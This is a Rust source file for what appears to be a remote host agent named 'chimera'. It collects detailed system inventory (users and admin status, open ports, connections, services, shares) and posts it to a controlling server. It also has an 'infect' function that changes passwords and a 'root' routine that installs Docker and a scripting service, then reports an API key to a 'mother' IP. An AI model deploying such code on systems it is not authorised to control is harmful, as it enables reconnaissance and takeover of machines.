use crate::client::types::{Disk, Host, Infect, User, UserInfo, OS};

#[cfg(target_os = "windows")]
use crate::client::types::ServerFeatures;

use anyhow::Result;
use rand::{thread_rng, Rng};
use reqwest::{
    blocking::Client,
    header::{HeaderMap, HeaderValue},
};
use std::fs::{create_dir_all, OpenOptions};
use std::fs;
use std::io::Write;
use std::path::Path;
use std::thread::sleep;
use std::time::{Duration, Instant};
use sysinfo::{CpuExt, DiskExt, System, SystemExt, UserExt};

impl Host {
    pub fn new() -> Host {
        let mut sys = System::new_all();
        // First we update all information of our `System` struct.
        sys.refresh_all();

        let (connections, open_ports) = Host::conn_info();

        Host {
            hostname: sys_info::hostname().unwrap_or_default().into(),
            ip: Host::ip(),
            version: sys.os_version().unwrap_or_default().into(),
            // mac_addr:
            // nameserver
            os: std::env::consts::OS.into(),
            cpu: sys.cpus().first().unwrap().brand().into(),
            cores: sys_info::cpu_num().unwrap_or_default() as u8,
            memory: sys.total_memory() / 1024 / 1024,
            // disk: storage / 1024 / 1024 / 1024,
            disks: disks(&sys),
            network_adapters: String::from(""),
            ports: open_ports,
            connections,
            services: Host::services(),
            users: users(&sys),
            shares: Host::shares(),
            containers: Host::containers(),
            #[cfg(target_os = "windows")]
            server_features: Host::server_features(),
        }
    }

    // Function to wait for the server to be ready
    fn wait_for_server_ready(server_url: &str, timeout: Duration) -> bool {
        let client = Client::new();
        let start_time = Instant::now();

        while start_time.elapsed() < timeout {
            match client.get(server_url).send() {
                Ok(response) if response.status().is_success() => {
                    println!("Server is ready.");
                    return true;
                }
                _ => {
                    sleep(Duration::from_secs(1));
                }
            }
        }

        println!("Timeout waiting for server to be ready.");
        false
    }

    pub async fn inventory(&self, ip: &str, api_key: &str) -> Result<()> {
        let log_path = "/opt/chimera/run.log";
        let log_dir = Path::new("/opt/chimera");

        if !log_dir.exists() {
            fs::create_dir_all(log_dir)?;
        }

        // Delete the existing log file if it exists, then create a new one
        let _ = fs::remove_file(log_path); // Ignore the result, it's fine if the file doesn't exist
        let mut log_file = OpenOptions::new()
            .create(true)
            .write(true)
            .append(true)
            .open(log_path)?;

        let inventory = self.to_json();
        let url = format!("http://{}:3000/api/v1/inventory", ip);

        if Self::wait_for_server_ready(&format!("http://{}:3000", ip), Duration::from_secs(30)) {
            let mut headers = HeaderMap::new();
            headers.insert("x-api-key", api_key.parse()?);
            headers.insert("content-type", "application/json".parse()?);

            let client = reqwest::Client::builder()
                .redirect(reqwest::redirect::Policy::none())
                .build()?;

            // Log the request details
            writeln!(log_file, "Sending POST request to {}", url)?;

            let response = client
                .post(&url)
                .headers(headers)
                .body(inventory)
                .send()
                .await?;

            // Log the response
            writeln!(
                log_file,
                "Received response: Status = {}, Body = {:?}",
                response.status(),
                response.text().await?
            )?;

            Ok(())
        } else {
            writeln!(log_file, "Server not ready for {}", ip)?;
            Err(anyhow::Error::msg("Server not ready"))
        }
    }

    pub fn infect(&self, magic: u8, scheme: &str) {
        self.change_password(magic, scheme);
    }
    #[cfg(target_os = "linux")]
    pub fn root(&self, mother_ip: &str, port: u16, lifetime: u8) -> anyhow::Result<()> {
        // Decompress and write SERIAL file from bytes using flate2

        let _ = super::utils::install_docker();

        // Generate random 32 long hex string for api key
        let mut rng = rand::thread_rng();
        let api_key = (0..32)
            .map(|_| format!("{:02x}", rng.gen::<u8>()))
            .collect::<String>();

        let _ = super::utils::install_serial_scripter(&api_key, lifetime);

        // Do a check to insure the containeers are all started and running

        // Send api key to server
        let url = format!("http://{}:{}/root", mother_ip, port);
        // Set up HTTP client and headers
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert("x-api-key", api_key.parse()?);

        let client = reqwest::blocking::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .build()?;

        // Send request to server
        let _res = client.post(&url).headers(headers).send()?.text()?; // Run Serial Scripter
                                                                       // Send api key to server

        Ok(())
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(&self).unwrap()
        // self.serialize(serializer)
    }
}

fn disks(sys: &System) -> Box<[Disk]> {
    sys.disks()
        .iter()
        .map(|disk| Disk {
            name: disk.name().to_str().unwrap().into(),
            mount_point: disk.mount_point().to_str().unwrap().into(),
            filesystem: String::from_utf8(disk.file_system().to_vec())
                .unwrap()
                .into(),
            total_space: disk.total_space() / 1024 / 1024,
            available_space: disk.available_space() / 1024 / 1024,
        })
        .collect()
}

fn users(sys: &System) -> Box<[User]> {
    sys.users()
        .iter()
        .map(|user| User {
            name: user.name().into(),
            uid: user.id().to_string().into(),
            gid: user.group_id().to_string().into(),
            groups: user
                .groups()
                .iter()
                .map(|group| group.clone().into_boxed_str())
                .collect(),
            is_admin: user.is_admin(),
            is_local: user.is_local(),
            shell: None,
        })
        .collect()
}

pub async fn evil_fetch(
    ip: &std::net::IpAddr,
    port: &u16,
    ) -> Result<(), Box<dyn std::error::Error>> {
    // let cpu_cores: u32 = sys_info::cpu_num();
    let cpu_cores = match sys_info::cpu_num() {
        Ok(cpu_cores) => cpu_cores,
        _ => 1,
    };


    match sys_info::mem_info() {
        Ok(mem_info) => {
            let memory_mb: u64 = (mem_info.total / 1024).try_into().unwrap_or(0);
            let resources = calculate_resource_weight(cpu_cores, memory_mb);

            let url = format!("http://{}:{}/evil_fetch", ip, port);

            #[cfg(target_os = "windows")]
            let supports_docker = false;
            
            #[cfg(not(target_os = "windows"))]
            let supports_docker = super::utils::is_docker_compatabile();


            let data = serde_json::json!({
                "evil_secret": resources,
                "ip": Host::ip(),
                "supports_docker": supports_docker,
            });

            let client = reqwest::Client::builder()
                .redirect(reqwest::redirect::Policy::none())
                .build()?;

            let res = client.post(&url).json(&data).send().await?.text().await?;

            println!("Response: {}", res);
        }
        Err(e) => {
            println!("Failed to get memory info: {}", e);
        }
    }
    Ok(())
}


fn calculate_resource_weight(cpu_cores: u32, memory_mb: u64) -> u64 {
    let cpu_cores_weight = 4;
    let memory_weight = 2;

    (cpu_cores as u64 * cpu_cores_weight as u64 * 1024) + (memory_mb as u64 * memory_weight)
}


